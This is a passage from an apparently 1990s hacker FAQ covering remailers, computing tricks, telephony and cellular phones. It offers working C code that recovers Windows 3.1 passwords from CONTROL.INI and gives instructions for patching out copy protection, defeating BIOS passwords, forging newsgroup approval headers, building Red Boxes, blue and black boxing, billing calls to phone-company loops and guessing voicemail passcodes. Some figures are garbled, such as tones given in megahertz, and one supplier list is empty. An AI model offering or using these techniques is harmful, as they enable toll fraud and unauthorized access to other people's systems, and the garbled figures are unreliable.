mail to another user of the system, then this is what happens:

1.  The mail is transported to anon.penet.fi, which resides somewhere in
    the vicinity of Espoo, Finland.

2.  These steps are carried out by software running on anon.penet.fi.
    Penet first looks up the email address of the sender in its
    database, then replaces it with the numeric code.  All other
    information about the sender is removed.

3.  Then, penet looks up the number of the recipient in the same
    database, and replaces it with the actual email address.

4.  Finally, it sends the mail to the actual email address of the
    recipient.

There are variations on this scheme, such as posting to Usenet (in which
step 3 is eliminated), but that's the basic idea.

Where anon.penet.fi uses a secret database to match anon id's to actual
email addresses, the cypherpunks remailers use cryptography to hide the
actual identities.  Let's say I want to send email to a real email
address, or post it to Usenet, but keep my identity completely hidden.
To send it through one remailer, this is what happens.

1.  I encrypt the message and the recipient's address, using the public
    key of the remailer of my choice.

2.  I send the email to the remailer.

3.  When the remailer gets the mail, it decrypts it using its private
    key, revealing as plaintext the message and the recipient's address.

4.  All information about the sender is removed.

5.  Finally, it sends it to the recipient's email address.

If one trusts the remailer operator, this is good enough.  However, the
whole point of the cypherpunks remailers is that you don't _have_ to
trust any one individual or system.  So, people who want real security
use a chain of remailers.  If any one remailer on the "chain" is honest,
then the privacy of the message is assured.

To use a chain of remailers, I first have to prepare the message, which
is nestled within multiple layers of encryption, like a Russian
matryoshka doll.  Preparing such a message is tedious and error prone,
so many people use an automated tool such as my premail package.
Anyway, after preparing the message, it is sent to the first remailer in
the chain, which corresponds to the outermost layer of encryption.  Each
remailer strips off one layer of encryption and sends the message to the
next, until it reaches the final remailer.  At this point, only the
innermost layer of encryption remains.  This layer is stripped off,
revealing the plaintext message and recipient for the first time.  At
this point, the message is sent to its actual recipient.

Remailers exist in many locations.  A typical message might go through
Canada, Holland, Berkeley, and Finland before ending up at its final
location.

Aside from the difficulty of preparing all the encrypted messages,
another drawback of the cypherpunk remailers is that they don't easily
allow responses to anonymous mail.  All information about the sender is
stripped away, including any kind of return address.  However the new
alias servers promise to change that.  To use an alias server, one
creates a new email address (mine is raph@alpha.c2.org).  Mail sent to
this new address will be untraceably forwarded to one's real address.

To set this up, one first encrypts one's own email address with multiple
layers of encryption.  Then, using an encrypted channel, one sends the
encrypted address to the alias server, along with the nickname that one
would like.  The alias server registers the encrypted address in the
database.  The alias server then handles reply mail in much the same way
as anon.penet.fi, except that the mail is forwarded to the chain of
anonymous remailers.

For maximum security, the user can arrange it so that, at each link in
the chain, the remailer adds another layer of encryption to the message
while removing one layer from the email address.  When the user finally
gets the email, it is encrypted in multiple layers.  The matryoshka has
to be opened one doll at a time until the plaintext message hidden
inside is revealed.

One other point is that the remailers must be reliable in order for all
this to work.  This is especially true when a chain of remailers is used
-- if any one of the remailers is not working, then the message will be
dropped.  This is why I maintain a list of reliable remailers. By
choosing reliable remailers to start with, there is a good chance the
message will finally get there.


32. What are the addresses of some anonymous remailers?

The most popular and stable anonymous remailer is anon.penet.fi,
operated by Johan Helsingus.  To obtain an anonymous ID, mail
ping@anon.penet.fi.

The server at anon.penet.fi does it's best to remove any headers or
other information describing its true origin.  You should make an effort
and try to omit information detailing your identity within such messages
as quite often signatures not starting with "--" are including within
your e-mail, this of course is not what you want.  You can send messages
to:

        anXXX@anon.penet.fi

Here you are addressing another anonymous user and your E-Mail message
will appear to have originated from anon.penet.fi.

        alt.security@anon.penet.fi

Here you are posting an anonymous message to a whole Usenet group and in
this case to alt.security which will be posted at the local site (in
this case Finland).

        ping@anon.penet.fi

If you send a message to this address you will be allocated an identity
(assuming you don't already have one).  You can also confirm your
identity here as well.

You can also set yourself a password, this password helps to
authenticate any messages that you may send.  This password is included
in your outgoing messages, to set a password send E-Mail to
password@anon.penet.fi with your password in the body of your text e.g.:

        To: password@anon.penet.fi
        Subject:
        TN0_rUlEz

For more information on this anonymous server send mail to:

        help@anon.penet.fi

Anonymous Usenet posting is frowned upon by other users of Usenet groups
claiming their opinions are worthless.  This is because they believe
anonymity is used to shield ones self from attacks from opponents, while
on the other hand it can be used to protect ones self from social
prejudice (or people reporting ones opinions to ones superiors).  Also
if you are thinking this is a useful tool to use to hid against the
authorities then think again, as there was a famous case where a Judge
ordered the administrator of the server to reveal the identity of a
poster.

33. How do I defeat Copy Protection?

There are two common methods of defeating copy protection.  The first
is to use a program that removes copy protection.  Popular programs
that do this are CopyIIPC from Central Point Software and CopyWrite
from Quaid Software.  The second method involves patching the copy
protected program.  For popular software, you may be able to locate a
ready made patch.  You can them apply the patch using any hex editor,
such as debug or the Peter Norton's DiskEdit.  If you cannot, you must
patch the software yourself.

Writing a patch requires a debugger, such as Soft-Ice or Sourcer.  It
also requires some knowledge of assembly language.  Load the protected
program under the debugger and watch for it to check the protection
mechanism.  When it does, change that portion of the code.  The code
can be changed from JE (Jump on Equal) or JNE (Jump On Not Equal) to
JMP (Jump Unconditionally).  Or the code may simply be replaced with
NOP (No Operation) instructions.


34. What is 127.0.0.1?

127.0.0.1 is a loopback network connection.  If you telnet, ftp, etc...
to it you are connected to your own machine.


35. How do I post to a moderated newsgroup?

Usenet messages consist of message headers and message bodies.  The
message header tells the news software how to process the message.
Headers can be divided into two types, required and optional. Required
headers are ones like "From" and "Newsgroups."  Without the required
headers, your message will not be posted properly.

One of the optional headers is the "Approved" header.  To post to a
moderated newsgroup, simply add an Approved header line to your
message header.  The header line should contain the newsgroup
moderators e-mail address.  To see the correct format for your target
newsgroup, save a message from the newsgroup and then look at it using
any text editor.

A "Approved" header line should look like this:

Approved: will@gnu.ai.mit.edu

There cannot not be a blank line in the message header.  A blank line
will cause any portion of the header after the blank line to be
interpreted as part of the message body.

For more information, read RFC 1036: Standard for Interchange of
USENET messages.


36. How do I post to Usenet via e-mail?

Through an e-mail->Usenet gateway.  Send an a e-mail messages to
<newsgroup>@<servername>.  For example, to post to alt.2600 through
nic.funet.fi, address your mail to alt.2600@nic.funet.fi.

Here are a few e-mail->Usenet gateways:

	group.name@news.demon.co.uk
	group.name@charm.magnus.acs.ohio-state.edu
	group.name@undergrad.math.uwaterloo.ca
	group.name@nic.funet.fi
	group.name.usenet@decwrl.dec.com


37. How do I defeat a BIOS password?

This depends on what BIOS the machine has.  Common BIOS's include AMI,
Award, IBM and Phoenix.  Numerous other BIOS's do exist, but these are
the most common.

Some BIOS's allow you to require a password be entered before the system
will boot. Some BIOS's allow you to require a password to be entered
before the BIOS setup may be accessed.

Every BIOS must store this password information somewhere.  If you are
able to access the machine after it has been booted successfully, you
may be able to view the password.  You must know the memory address
where the password is stored, and the format in which the password is
stored.  Or, you must have a program that knows these things.

The most common BIOS password attack programs are for Ami BIOS.  Some
password attack programs will return the AMI BIOS password in plain
text, some will return it in ASCII codes, some will return it in scan
codes. This appears to be dependent not just on the password attacker,
but also  on the version of Ami BIOS.

To obtain Ami BIOS password attackers, ftp to oak.oakland.edu
/simtel/msdos/sysutil/.

If you cannot access the machine after if has been powered up, it is
still possible to get past the password.  The password is stored in CMOS
memory that is maintained while the PC is powered off by a small
battery, which is attached to the motherboard.  If you remove this
battery, all CMOS information will be lost.  You will need to re-enter
the correct CMOS setup information to use the machine.  The machines
owner or user will most likely be alarmed when it is discovered that the
BIOS password has been deleted.

On some motherboards, the battery is soldered to the motherboard, making
it difficult to remove.  If this is the case, you have another
alternative.  Somewhere on the motherboard you should find a jumper that
will clear the BIOS password.  If you have the motherboard
documentation, you will know where that jumper is.  If not, the jumper
may be labeled on the motherboard.  If you are not fortunate enough for
either of these to be the case, you may be able to guess which jumper is
the correct jumper.  This jumper is usually standing alone near the
battery.

39. Is there any hope of a decompiler that would convert an executable
    program into C/C++ code?

This FAQ answer is an excerpt from SNIPPETS by Bob Stout.

Don't hold your breath. Think about it... For a decompiler to work
properly, either 1) every compiler would have to generate substantially
identical code, even with full optimization turned on, or 2) it would
have to recognize the individual output of every compiler's code
generator.

If the first case were to be correct, there would be no more need for
compiler benchmarks since every one would work the same.  For the second
case to be true would require in immensely complex program that had to
change with every new compiler release.

OK, so what about specific decompilers for specific compilers - say a
decompiler designed to only work on code generated by, say, BC++ 4.5?
This gets us right back to the optimization issue.  Code written for
clarity and understandability is often inefficient.  Code written for
maximum performance (speed or size) is often cryptic (at best!) Add to
this the fact that all modern compilers have a multitude of optimization
switches to control which optimization techniques to enable and which to
avoid.  The bottom line is that, for a reasonably large, complex source
module, you can get the compiler to produce a number of different object
modules simply by changing your optimization switches, so your
decompiler will also have to be a deoptimizer which can automagically
recognize which optimization strategies were enabled at compile time.

OK, let's simplify further and specify that you only want to support one
specific compiler and you want to decompile to the most logical source
code without trying to interpret the optimization.  What then?  A good
optimizer can and will substantially rewrite the internals of your code,
so what you get out of your decompiler will be, not only cryptic, but in
many cases, riddled with goto statements and other no-no's of good
coding practice.  At this point, you have decompiled source, but what
good is it?

Also note carefully my reference to source modules.  One characteristic
of C is that it becomes largely unreadable unless broken into easily
maintainable source modules (.C files).  How will the decompiler deal
with that? It could either try to decompile the whole program into some
mammoth main() function, losing all modularity, or it could try to place
each called function into its own file.  The first way would generate
unusable chaos and the second would run into problems where the original
source hade files with multiple functions using static data and/or one
or more functions calling one or more static functions.  A decompiler
could make static data and/or functions global but only at the expense
or readability (which would already be unacceptable).

Finally, remember that commercial applications often code the most
difficult or time-critical functions in assembler which could prove
almost impossible to decompile into a C equivalent.

Like I said, don't hold your breath. As technology improves to where
decompilers may become more feasible, optimizers and languages (C++, for
example, would be a significantly tougher language to decompile than C)
also conspire to make them less likely.

For years Unix applications have been distributed in shrouded source
form (machine but not human readable -- all comments and whitespace
removed, variables names all in the form OOIIOIOI, etc.), which has been
a quite adequate means of protecting the author's rights.  It's very
unlikely that decompiler output would even be as readable as shrouded
source.


40. How does the MS-Windows password encryption work?

The password option in MS Win 3.1 is easily defeated, but there are
those of us who really want to know how MS does this.  There are many
reasons why knowing the actual password can be useful.  Suppose a
sysamin used the same password in the windows screen saver as his root
account on a unix box.

Anyway, I will attempt to relay what I have learned about this algorithm.

I will describe the process starting after you've entered the password
and hit the [OK] button.

I will make the assumtion that everyone (at least those interested) know
what the XOR operation is.

First, the length of the password is saved.  We'll call this 'len'.  We
will be moving characters from the entered string into another string as
they are encrypted.  We'll call the originally entered password
'plaintext' and the encrypted string(strings--there are two passes)
'hash1' and 'hash2.'  The position in the plaintext is important during
the process so we'll refer to this as 'pos.'  After each step of the
hashing process, the character is checked against a set of characters
that windows considers 'special.'  These characters are '[ ] =' and any
character below ASCII 33 or above ASCII 126.  I'll refer to this
checking operation as 'is_ok.'  All indecies are zero-based (i.e. an 8
character password is considered chars 0 to 7).

Now, the first character of 'plaintext' is xor'd with 'len' then fed to
'is_ok'.  if the character is not valid, it is replaced by the original
character of 'plaintext' before going to the next operation.  The next
operation is to xor with 'pos' (this is useless for the first operation
since 'len' is 0 and anything xor'd with zero is itself) then fed to
'is_ok' and replaced with the original if not valid.  The final
operation (per character) is to xor it with the previous character of
'plaintext'. Since there is no previous character, the fixed value, 42,
is used on the first character of 'plaintext'.  This is then fed to
'is_ok' and if OK, it is stored into the first position of 'hash1'  This
process proceeds until all characters of plaintext are exhausted.

The second pass is very similar, only now, the starting point is the
last character in hash1 and the results are placed into hash2 from the
end to the beginning.  Also, instead of using the previous character in
the final xoring, the character following the current character is used.
Since there is no character following the last character in hash1, the
value, 42 is again used for the last character.

'hash2' is the final string and this is what windows saves in the file
CONTROL.INI.

To 'decrypt' the password, the above procedure is just reversed.

Now, what you've all been waiting for.  Here is some C code that will do
the dirty work for you:

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int xor1(int i,int j)
{
  int x;

  x=i^j;
  return (x>126||x<33||x==91||x==93||x==61)?i:x;
}
void main()
{
  FILE *f;
  int i,l;
  char s[80],s1[80];

  printf("Please enter the path to your Windows directory\n");
  gets(s1);
  sprintf(s,"%s%scontrol.ini",s1,s1[strlen(s1)-1]=='\\'?"":"\\");
  if((f=fopen(s,"rt"))==NULL){
    printf("File Error : %s\n",sys_errlist[errno]);
    exit(0);
  }
  while(strnicmp(fgets(s1,70,f),"password",8)!=0&&!feof(f));
  fclose(f);
  strtok(s1,"=\n");
  strcpy(s,strtok(NULL,"\n"));
  i=strlen(s)-1;
  for(l=i;l>-1;l--)
    s1[l]=xor1(xor1(xor1(s[l],l==i?42:s[l+1]),l==i?0:l),i+1);
  for(l=0;l<i+1;l++)
    s[l]=xor1(xor1(xor1(s1[l],l?s1[l-1]:42),l?l:0),i+1);
  printf("The Password is: %s\n",s);
}





Section B: Telephony
~~~~~~~~~~~~~~~~~~~~

01. What is a Red Box?

When a coin is inserted into a payphone, the payphone emits a set of
tones to ACTS (Automated Coin Toll System).  Red boxes work by fooling
ACTS into believing you have actually put money into the phone.  The
red box simply plays the ACTS tones into the telephone microphone.
ACTS hears those tones, and allows you to place your call.  The actual
tones are:

Nickel Signal      1700+2200hz  0.060s on
Dime Signal        1700+2200hz  0.060s on, 0.060s off, twice repeating
Quarter Signal     1700+2200hz  33ms on, 33ms off, 5 times repeating


Canada uses a variant of ACTSD called N-ACTS.  N-ACTS uses different
tones than ACTS.  In Canada, the tones to use are:

Nickel Signal      2200hz       0.060s on
Dime Signal        2200hz       0.060s on, 0.060s off, twice repeating
Quarter Signal     2200hz       33ms on, 33ms off, 5 times repeating


02. How do I build a Red Box?

Red boxes are commonly manufactured from modified Radio Shack tone
dialers, Hallmark greeting cards, or made from scratch from readily
available electronic components.

To make a Red Box from a Radio Shack 43-141 or 43-146 tone dialer, open
the dialer and replace the crystal with a new one. The purpose of the
new crystal is to cause the * button on your tone dialer to create a
1700Mhz and 2200Mhz tone instead of the original 941Mhz and 1209Mhz
tones.  The exact value of the replacement crystal should be 6.466806 to
create a perfect 1700Mhz tone and 6.513698 to create a perfect 2200mhz
tone.  A crystal close to those values will create a tone that easily
falls within the loose tolerances of ACTS. The most popular choice is
the 6.5536Mhz crystal, because it is the easiest to procure.  The old
crystal is the large shiny metal component labeled "3.579545Mhz."  When
you are finished replacing the crystal, program the P1 button with five
*'s.  That will simulate a quarter tone each time you press P1.


03. Where can I get a 6.5536Mhz crystal?

Your best bet is a local electronics store.  Radio Shack sells them, but
they are overpriced and the store must order them in.  This takes
approximately two weeks.  In addition, many Radio Shack employees do not
know that this can be done.

Or, you could order the crystal mail order.  This introduces Shipping
and Handling charges, which are usually much greater than the price of
the crystal.  It's best to get several people together to share the S&H
cost.  Or, buy five or six yourself and sell them later.  Some of the
places you can order crystals are:

04. Which payphones will a Red Box work on?

Red Boxes will work on telco owned payphones, but not on COCOT's
(Customer Owned Coin Operated Telephones).

Red boxes work by fooling ACTS (Automated Coin Toll System) into
believing you have put money into the pay phone.  ACTS is the
telephone company software responsible for saying "Please deposit XX
cents" and listening for the coins being deposited.

COCOT's do not use ACTS.  On a COCOT, the pay phone itself is
responsible for determining what coins have been inserted.


05. How do I make local calls with a Red Box?

Payphones do not use ACTS for local calls.  To use your red box for
local calls, you have to fool ACTS into getting involved in the call.

One way to do this, in some areas, is by dialing 10288-xxx-xxxx.  This
makes your call a long distance call, and brings ACTS into the
picture.

In other areas, you can call Directory Assistance and ask for the
number of the person you are trying to reach.  The operator will give
you the number and then you will hear a message similar to "Your call
can be completed automatically for an additional 35 cents."  When this
happens, you can then use ACTS tones.


06. What is a Blue Box?

Blue boxes use a 2600hz tone to size control of telephone switches
that use in-band signalling.  The caller may then access special
switch functions, with the usual purpose of making free long distance
phone calls, using the tones provided by the Blue Box.


07. Do Blue Boxes still work?

This FAQ answer is excerpted from a message posted to Usenet by
Marauder of the Legion of Doom:

        Somewhere along the line I have seen reference to something
        similar to "Because of ESS Blue boxing is impossible".  This is
        incorrect.  When I lived in Connecticut I was able to blue box
        under Step by Step, #1AESS, and DMS-100.  The reason is simple,
        even though I was initiating my call to an 800 number from a
        different exchange (Class 5 office, aka Central Office) in each
        case, when the 800 call was routed to the toll network it would
        route through the New Haven #5 Crossbar toll Tandem office.  It
        just so happens that the trunks between the class 5 (CO's) and
        the class 4 (toll office, in this case New Haven #5 Xbar),
        utilized in-band (MF) signalling, so regardless of what I
        dialed, as long as it was an Inter-Lata call, my call would
        route through this particular set of trunks, and I could Blue
        box until I was blue in the face.  The originating Central
        Offices switch (SXS/ESS/Etc..) had little effect on my ability
        to box at all.  While the advent of ESS (and other electronic
        switches) has made the blue boxers task a bit more difficult,
        ESS is not the reason most of you are unable to blue box.  The
        main culprit is the "forward audio mute" feature of CCIS (out of
        band signalling).  Unfortunately for the boxer 99% of the Toll
        Completion centers communicate using CCIS links, This spells
        disaster for the blue boxer since most of you must dial out of
        your local area to find trunks that utilize MF signalling, you
        inevitably cross a portion of the network that is CCIS equipped,
        you find an exchange that you blow 2600hz at, you are rewarded
        with a nice "winkstart", and no matter what MF tones you send at
        it, you meet with a re-order.  This is because as soon as you
        seized the trunk (your application of 2600hz), your Originating
        Toll Office sees this as a loss of supervision at the
        destination, and Mutes any further audio from being passed to
        the destination (ie: your waiting trunk!).  You meet with a
        reorder because the waiting trunk never "hears" any of the MF
        tones you are sending, and it times out.  So for the clever
        amongst you, you must somehow get yourself to the 1000's of
        trunks out there that still utilize MF signalling but
        bypass/disable the CCIS audio mute problem.  (Hint: Take a close
        look at WATS extenders).


08. What is a Black Box?

A Black Box is a resistor (and often capacitor in parallel) placed in
series across your phone line to cause the phone company equipment to be
unable to detect that you have answered your telephone.  People who call
you will then not be billed for the telephone call.  Black boxes do not
work under ESS.

10. What is an ANAC number?

An ANAC (Automatic Number Announcement Circuit) number is a telephone
number that plays back the number of the telephone that called it.
ANAC numbers are convenient if you want to know the telephone number
of a pair of wires.


11. What is the ANAC number for my area?

How to find your ANAC number:

Look up your NPA (Area Code) and try the number listed for it. If that
fails, try 1 plus the number listed for it.  If that fails, try the
common numbers like 311, 958 and 200-222-2222.  If you find the ANAC
number for your area, please let us know.

Note that many times the ANAC number will vary for different switches
in the same city.  The geographic naming on the list is NOT intended
to be an accurate reference for coverage patterns, it is for
convenience only.

Many companies operate 800 number services which will read back to you
the number from which you are calling.  Many of these require navigating
a series of menus to get the phone number you are looking for.  Please
use local ANAC numbers if you can, as overuse or abuse can kill 800 ANAC
numbers.

  (800)692-6447   (800)MY-ANI-IS  (Now protected by a passcode!)
N (800)858-9857   AT&T True Rewards

A non-800 ANAC that works nationwide is 404-988-9664.  The one catch
with this number is that it must be dialed with the AT&T Carrier Access
Code 10732.  Use of this number does not appear to be billed.

Note: These geographic areas are for reference purposes only.  ANAC
numbers may vary from switch to switch within the same city.

12. What is a ringback number?

A ringback number is a number that you call that will immediately
ring the telephone from which it was called.

In most instances you must call the ringback number, quickly hang up
the phone for just a short moment and then let up on the switch, you
will then go back off hook and hear a different tone.  You may then
hang up.  You will be called back seconds later.


13. What is the ringback number for my area?

An 'x' means insert those numbers from the phone number from which you
are calling.  A '?' means that the number varies from switch to switch
in the area, or changes from time to time.  Try all possible
combinations.

If the ringback for your NPA is not listed, try common ones such as 114,
951-xxx-xxxx, 954, 957 and 958.  Also, try using the numbers listed for
other NPA's served by your telephone company.

Note: These geographic areas are for reference purposes only.  Ringback
numbers may vary from switch to switch within the same city.

This FAQ answer is excerpted from: ToneLoc v0.99 User Manual
				   by Minor Threat & Mucho Maas

Loops are a pair of phone numbers, usually consecutive, like 836-9998
and 836-9999.  They are used by the phone company for testing.  What
good do loops do us?  Well, they are cool in a few ways.  Here is a
simple use of loops.  Each loop has two ends, a 'high' end, and a
'low' end.  One end gives a (usually) constant, loud tone when it is
called. The other end is silent.  Loops don't usually ring either.
When BOTH ends are called, the people that called each end can talk
through the loop.  Some loops are voice filtered and won't pass
anything but a constant tone; these aren't much use to you.  Here's
what you can use working loops for:  billing phone calls!  First, call
the end that gives the loud tone.  Then if the operator or someone
calls the other end, the tone will go quiet.  Act like the phone just
rang and you answered it ... say "Hello", "Allo", "Chow", "Yo", or
what the fuck ever.  The operator thinks that she just called you, and
that's it!  Now the phone bill will go to the loop, and your local
RBOC will get the bill!  Use this technique in moderation, or the loop
may go down.  Loops are probably most useful when you want to talk to
someone to whom you don't want to give your phone number.

16. What is a CNA number?

CNA stands for Customer Name and Address.  The CNA number is a phone
number for telephone company personnel to call and get the name and
address for a phone number.  If a telephone lineman finds a phone line
he does not recognize, he can use the ANI number to find its phone
number and then call the CNA operator to see who owns it and where
they live.

Normal CNA numbers are available only to telephone company personnel.
Private citizens may legally get CNA information from private
companies.  Two such companies are:

Unidirectory    (900)933-3330
Telename        (900)884-1212

Note that these are 900 numbers, and will cost you approximately one
dollar per minute.

If you are in 312 or 708, AmeriTech has a pay-for-play CNA service
available to the general public.  The number is 796-9600.  The cost is
$.35/call and can look up two numbers per call.

If you are in 415, Pacific Bell offers a public access CNL service at
(415)705-9299.

If you are in Bell Atlantic territory you can call (201)555-5454 or
(908)555-5454 for automated CNA information.  The cost is $.50/call.

22. What is scanning?

Scanning is dialing a large number of telephone numbers in the hope
of finding interesting carriers (computers) or tones.

Scanning can be done by hand, although dialing several thousand
telephone numbers by hand is extremely boring and takes a long time.

Much better is to use a scanning program, sometimes called a war
dialer or a demon dialer.  Currently, the best war dialer available to
PC-DOS users is ToneLoc from Minor Threat and Mucho Maas.  ToneLoc can
be ftp'd from ftp.paranoia.com /pub/toneloc/.

A war dialer will dial a range of numbers and log what it finds at
each number.  You can then only dial up the numbers that the war
dialer marked as carriers or tones.


23. Is scanning illegal?

Excerpt from: 2600, Spring 1990, Page 27:

-BQ-
In some places, scanning has been made illegal.  It would be hard,
though, for someone to file a complaint against you for scanning since
the whole purpose is to call every number once and only once.  It's
not likely to be thought of as harassment by anyone who gets a single
phone call from a scanning computer.  Some central offices have been
known to react strangely when people start scanning.  Sometimes you're
unable to get a dialtone for hours after you start scanning.  But
there is no uniform policy.  The best thing to do is to first find out
if you've got some crazy law saying you can't do it.  If, as is
likely, there is no such law, the only way to find out what happens is
to give it a try.
-EQ-

It should be noted that a law making scanning illegal was recently
passed in Colorado Springs, CO.  It is now illegal to place a call
in Colorado Springs without the intent to communicate.

25. What are the DTMF frequencies?

DTMF stands for Dual Tone Multi Frequency.  These are the tones you get
when you press a key on your telephone touch pad.  The tone of the
button is the sum of the column and row tones.  The ABCD keys do not
exist on standard telephones.

Notes:

[C1]     - Means code used for Cellular One service
[1]      - for cellular in Pittsburgh, PA A/C 412 in some areas
[2]      - indicates that you are not local and maybe how to reach you
[3]      - found in Pac Bell territory; Intercom ring causes a distinctive
           ring to be generated on the current line; Hold keeps a call
           connected until another extension is picked up
[4]      - applied once before each call
[5]      - A.C.R. blocks calls from those who blocked Caller ID
           (used in C&P territory, for instance)
[6]      - cancels further return attempts
[7]      - *82 (1182) has been mandated to be the nationwide code for
           "Send CLID info regardless of the default setting on this
           phone line."
[M: *xx] - alternate code used for MLVP (multi-line variety package)
           by Bellcore. It goes by different names in different RBOCs.
           In Bellsouth it is called Prestige. It is an arrangement of
           ESSEX like features for single or small multiple line groups.

           The reason for different codes for some features in MLVP is that
           call-pickup is *8 in MLVP so all *8x codes are reassigned *5x

29. What is Caller-ID?

This FAQ answer is stolen from Rockwell:

Calling Number Delivery (CND), better known as Caller ID, is a
telephone service intended for residential and small business
customers.  It allows the called Customer Premises Equipment (CPE) to
receive a calling party's directory number and the date and time of
the call during the first 4 second silent interval in the ringing
cycle.

Parameters
~~~~~~~~~~
The data signalling interface has the following characteristics:

        Link Type:                              2-wire, simplex
	Transmission Scheme:		Analog, phase-coherent FSK
	Logical 1 (mark)			1200 +/- 12 Hz
	Logical 0 (space)			2200 +/- 22 Hz
	Transmission Rate:			1200 bps
	Transmission Level:			13.5 +/- dBm into 900 ohm load


Protocol
~~~~~~~~
The protocol uses 8-bit data words (bytes), each bounded by a start
bit and a stop bit.  The CND message uses the Single Data Message
format shown below.

| Channel  |  Carrier  |  Message  |  Message  |  Data       | Checksum |
| Seizure  |  Signal   |  Type     |  Length   |  Word(s)    | Word     |
| Signal   |           |  Word     |  Word     |             |          |

Channel Seizure Signal
~~~~~~~~~~~~~~~~~~~~~~
The channel seizure is 30 continuous bytes of 55h (01010101) providing
a detectable alternating function to the CPE (i.e. the modem data
pump).

Carrier Signal
~~~~~~~~~~~~~~
The carrier signal consists of 130 +/- 25 mS of mark (1200 Hz) to
condition the receiver for data.

Message Type Word
~~~~~~~~~~~~~~~~~
The message type word indicates the service and capability associated
with the data message.  The message type word for CND is 04h
(00000100).

Message Length Word
~~~~~~~~~~~~~~~~~~~
The message length word specifies the total number of data words to
follow.

Data Words
~~~~~~~~~~
The data words are encoded in ASCII and represent the following
information:

o  The first two words represent the month
o  The next two words represent the day of the month
o  The next two words represent the hour in local military time
o  The next two words represent the minute after the hour
o  The calling party's directory number is represented by the
   remaining  words in the data word field

If the calling party's directory number is not available to the
terminating central office, the data word field contains an ASCII "O".
If the calling party invokes the privacy capability, the data word
field contains an ASCII "P".

Checksum Word
~~~~~~~~~~~~~
The Checksum Word contains the twos complement of the modulo 256 sum
of the other words in the data message (i.e., message type, message
length, and data words).  The receiving equipment may calculate the
modulo 256 sum of the received words and add this sum to the received
checksum word.  A result of zero generally indicates that the message
was correctly received.  Message retransmission is not supported.

Example CNS Single Data Message
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
An example of a received CND message, beginning with the message type
word, follows:

04 12 30 39 33 30 31 32 32 34 36 30 39 35 35 35 31 32 31 32 51

04h=  Calling number delivery information code (message type word)
12h=  18 decimal; Number of data words (date,time, and directory
      number words)
ASCII 30,39= 09; September
ASCII 33,30= 30; 30th day
ASCII 31,32= 12; 12:00 PM
ASCII 32,34= 24; 24 minutes (i.e., 12:24 PM)
ASCII 36,30,39,35,35,35,31,32,31,32= (609) 555-1212; calling
      party's directory number
51h=  Checksum Word

Data Access Arrangement (DAA) Requirements
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
To receive CND information, the modem monitors the phone line between
the first and second ring bursts without causing the DAA to go off
hook in the conventional sense, which would inhibit the transmission
of CND by the local central office.  A simple modification to an
existing DAA circuit easily accomplishes the task.

Modem Requirements
~~~~~~~~~~~~~~~~~~
Although the data signalling interface parameters match those of a
Bell 202 modem, the receiving CPE need not be a Bell 202 modem.  A
V.23 1200 bps modem receiver may be used to demodulate the Bell 202
signal.  The ring indicate bit (RI) may be used on a modem to indicate
when to monitor the phone line for CND information.  After the RI bit
sets, indicating the first ring burst, the host waits for the RI bit
to reset.  The host then configures the modem to monitor the phone
line for CND information.

Signalling
~~~~~~~~~~
According to Bellcore specifications, CND signalling starts as early
as 300 mS after the first ring burst and ends at least 475 mS before
the second ring burst

Applications
~~~~~~~~~~~~
Once CND information is received the user may process the information
in a number of ways.

1.  The date, time, and calling party's directory number can be
    displayed.

2.  Using a look-up table, the calling party's directory number can be
    correlated with his or her name and the name displayed.

3.  CND information can also be used in additional ways such as for:

    a.  Bulletin board applications
    b.  Black-listing applications
    c.  Keeping logs of system user calls, or
    d.  Implementing a telemarketing data base

30. How do I block Caller-ID?

Always test as much as possible before relying on any method of blocking
Caller-ID.  Some of these methods work in some areas, but not in others.

Dial *67 before you dial the number.  (141 in the United Kingdom)
Dial your local TelCo and have them add Caller-ID block to your line.
Dial the 0 Operator and have him or her place the call for you.
Dial the call using a pre-paid phone card.
Dial through Security Consultants at (900)PREVENT for U.S. calls
     ($1.99/minute) or (900)STONEWALL for international calls ($3.99/minute).
Dial from a pay phone.  :-)


31. What is a PBX?

A PBX is a Private Branch Exchange.  A PBX is a small telephone switch
owned by a company or organization.  Let's say your company has a
thousand employees.  Without a PBX, you would need a thousand phone
lines.  However, only 10% of your employees are talking on the phone
at one time.  What if you had a computer that automatically found an
outside line every time one of your employees picked up the telephone.
With this type of system, you could get by with only paying for one
hundred phone lines.  This is a PBX.


32. What is a VMB?

A VMB is a Voice Mail Box.  A VMB is a computer that acts as an
answering machine for hundreds or thousands of users.  Each user will
have their own Voice Mail Box on the system.  Each mail box will have
a box number and a pass code.

Without a passcode, you will usually be able to leave messages to
users on the VMB system.  With a passcode, you can read messages and
administer a mailbox.  Often, mailboxes will exist that were created
by default or are no longer used.  These mailboxes may be taken over
by guessing their passcode.  Often the passcode will be the mailbox
number or a common number such as 1234.


33. What are the ABCD tones for?

The ABCD tones are simply additional DTFM tones that may be used in any
way the standard (0-9) tones are used.  The ABCD tones are used in the
U.S. military telephone network (AutoVon), in some Automatic Call
Distributor (ACD) systems, for control messages in some PBX systems, and
in some amateur radio auto-patches.

In the AutoVon network, special telephones are equipped with ABCD keys.
The ABCD keys are defined as such:

A - Flash
B - Flash override priority
C - Priority communication
D - Priority override

Using a built-in maintenance mode of the Automatic Call Distributor
(ACD) systems once used by Directory Assistance operators, you could
connect two callers together.

The purpose of the Silver Box is to create the ABCD tones.

See also "What are the DTMF Frequencies?"


34. What are the International Direct Numbers?

The numbers are used so that you may connect to an operator from a
foreign telephone network, without incurring long distance charges.
These numbers may be useful in blue boxing, as many countries still have
older switching equipment in use.

Section C: Cellular
~~~~~~~~~~~~~~~~~~~

01. What is an MTSO?

MTSO stands for Mobile Telephone Switching Office.  The MTSO is the
switching office that connects all of the individual cell towers to the
Central Office (CO).

The MTSO is responsible for monitoring the relative signal strength of
your cellular phone as reported by each of the cell towers, and
switching your conversation to the cell tower which will give you the
best possible reception.


02. What is a NAM?

NAM stands for Number Assignment Module.  The NAM is the EPROM that
holds information such as the MIN and SIDH.  Cellular fraud is committed
by modifying the information stored in this component.


03. What is an ESN?

ESN stands for Electronic Serial Number.  The is the serial number of
your cellular telephone.


04. What is an MIN?

MIN stands for Mobile Identification Number.  This is the phone number
of the cellular telephone.


05. What is a SCM?

SCM stands for Station Class Mark.  The SCM is a 4 bit number which
holds three different pieces of information.  Your cellular telephone
transmits this information (and more) to the cell tower.  Bit 1 of the
SCM tells the cell tower whether your cellphone uses the older 666
channel cellular system, or the newer 832 channel cellular system.  The
